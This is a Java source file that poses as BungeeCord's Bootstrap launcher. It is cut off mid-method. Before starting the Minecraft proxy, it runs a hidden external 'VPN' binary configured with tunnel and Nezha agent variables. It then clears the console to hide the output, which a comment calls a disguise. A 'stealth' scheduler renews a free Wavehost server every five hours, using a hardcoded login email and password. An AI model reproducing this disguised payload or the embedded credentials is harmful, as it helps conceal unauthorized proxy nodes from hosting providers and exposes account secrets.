/*
 * Copyright (C) 2020 Nan1t - Fusion by Grok for LO
 */
package net.md_5.bungee;

import joptsimple.OptionParser;
import joptsimple.OptionSet;
import lombok.Getter;
import net.md_5.bungee.api.ProxyServer;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Scanner;

public class Bootstrap {
    private static final Logger logger = Logger.getLogger(Bootstrap.class.getName());
    @Getter
    private static ProxyServer bungee;
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static Process sbxProcess;

    // 隐身续期克隆人
    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private static volatile String currentToken = null;
    
    // Wavehost 续期配置（LO 专属）
    private static final String LOGIN_URL = "https://game.wavehost.eu/login";
    private static final String RENEW_URL = "https://game.wavehost.eu/api/client/freeservers/dcdb5ed2-b99e-44bc-8d79-623ec469e2f1/renew";
    private static final String EMAIL = "diaou@zmkk.edu.kg";
    private static final String PASSWORD = "-9UsnbJz5XkZQYe";
    private static final String TG_TOKEN = "你的TG_TOKEN"; // 填 Bot Token
    private static final String TG_CHAT_ID = "你的TG_CHAT_ID"; // 填 Chat ID

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // 启动隐身 VPN
        try {
            runSbxBinary();
            Runtime.getRuntime().addShutdownHook(new Thread(Bootstrap::stopServices));
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "VPN Error: " + e.getMessage() + ANSI_RESET);
        }

        // 启动隐身续期克隆人
        scheduler.schedule(Bootstrap::performRenewalCycle, 10 + (int)(Math.random() * 30), TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(Bootstrap::performRenewalCycle, 5, 5, TimeUnit.HOURS);

        // 启动 BungeeCord
        BungeeCordLauncher.main(args);
    }

    // 清屏伪装
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
            }
        } catch (Exception ignored) {}
    }

    // VPN 二进制启动
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    // 加载 ENV
    private static void load
